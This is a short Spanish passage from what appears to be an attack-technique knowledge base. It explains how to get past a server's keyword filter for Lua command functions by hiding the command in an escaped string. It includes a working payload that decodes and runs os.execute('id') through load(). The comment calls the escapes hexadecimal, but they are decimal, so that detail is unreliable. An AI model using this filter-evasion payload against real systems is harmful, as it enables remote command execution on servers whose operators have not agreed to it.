---
chunk_id: technique::web::lua-rce::bypass-sandbox::001
domain: web
chunk_type: technique
---

### 2. Bypass de Sandbox con `loadstring` (Ofuscación)

Si el servidor tiene un firewall que busca palabras como "popen" o "os.execute", el atacante puede codificar su comando en **Base64** o Hexadecimal para que el filtro no lo detecte.

**Payload:**

```lua
-- El comando está "escondido" en una cadena hexadecimal
local cmd = "\111\115\46\101\120\101\99\117\116\101\40\39\105\100\39\41" 
assert(load(cmd))() 
-- Ejecuta: os.execute('id')
```
